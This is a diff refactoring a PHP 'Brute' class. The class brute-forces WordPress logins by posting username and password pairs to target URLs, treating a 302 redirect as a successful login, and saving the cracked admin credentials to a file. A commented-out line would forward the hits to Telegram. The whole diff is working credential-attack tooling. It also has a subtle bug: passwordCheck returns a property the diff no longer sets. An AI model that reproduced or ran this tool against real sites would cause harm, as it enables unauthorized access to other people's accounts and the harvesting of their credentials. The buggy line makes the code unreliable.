@@ -24,75 +24,64 @@ class Brute
             ->retry(3)
             ->followRedirects(0)
             ->build();
-
-        $this->login     = null;
-        $this->password  = null;
-
-        $this->iteration = (bool)true;
     }
 
     public function __invoke($data)
     {
-        $this->url = explode(';', $data['url'])[0];
+        $url = explode(';', $data['url'])[0];
+        $login = $this->loginCheck($data);
+        $password = $this->passwordCheck($data, $login);
+        $iteration = $this->checkIterator($data, $login, $password);
+
         $log = new Logger('name');
 
-        $this->loginCheck($data);
-        $this->passwordCheck($data);
-        $this->checkIterator($data);
+        $body = new FormBody;
+        $body->addField('log', $login);
+        $body->addField('pwd', $password);
 
-//        print_r([
-//            'url'       => $this->url,
-//            'login'     => $this->login,
-//            'password'  => $this->password,
-//            'iteration' =>$this->iteration
-//        ]);die;
+        $request = new Request($url, 'POST');
+        $request->setTcpConnectTimeout(2400);
+        $request->setBody($body);
 
-            $body = new FormBody;
-            $body->addField('log', $this->login);
-            $body->addField('pwd', $this->password);
+        $response = yield $this->client->request($request);
+        $originalResponse = $response->getOriginalResponse();
 
-            $request = new Request($this->url, 'POST');
-            $request->setTcpConnectTimeout(2400);
-            $request->setBody($body);
 
-            $response = yield $this->client->request($request);
-            $originalResponse = $response->getOriginalResponse();
-
+        if ($originalResponse->getStatus() === 302) {
             print_r([
-                'login' => $this->login,
-                '$this->password' => $this->password,
-                'status' => $originalResponse->getStatus(),
+                'url' => $url,
+                'login' => $login,
+                'password' => $password,
             ]);
-
-            if ($originalResponse->getStatus() === 302) {
-                echo $this->login . ":" . $this->password . PHP_EOL;
-                $wp_admin = $this->url . ";" . $this->login . ";" . $this->password;
-                file_put_contents('data/wp_admins.txt', $wp_admin . PHP_EOL, FILE_APPEND);
+            file_put_contents('data/wp_admins.txt', "{$url};{$login};{$password}" . PHP_EOL, FILE_APPEND);
 
 //                (new Telegram())->sendMessage($wp_admin);
-            }
+        }
+
     }
 
-    public function checkIterator($data) {
-        if (( $this->login == null && $this->password == null) || ( $data['login'] != '{login}' && $data['login'] == $this->login )) {
-            $this->iteration = false;
+    public function checkIterator($data, $login, $password) {
+        if (( $login == null && $password == null) || ( $data['login'] != '{login}' && $data['login'] == $login )) {
+            return false;
+        } else {
+            return true;
         }
     }
 
     public function loginCheck($data) {
         if ($data['login'] == '{login}' && !isset(explode(';', $data['url'])[1])) {
-            $this->login = null;
+            return null;
         } elseif ($data['login'] == '{login}' && isset(explode(';', $data['url'])[1])) {
-            $this->login = explode(';', $data['url'])[1];
+            return explode(';', $data['url'])[1];
         } else {
-            $this->login = $data['login'];
+            return $data['login'];
         }
     }
 
-    public function passwordCheck($data) {
-        if ($data['password'] == '{login}' && $this->login != null)
-            $this->password = $this->login;
+    public function passwordCheck($data, $login) {
+        if ($data['password'] == '{login}' && $login != null)
+            return $this->login;
         else
-            $this->password = $data['password'];
+            return $data['password'];
     }
 }
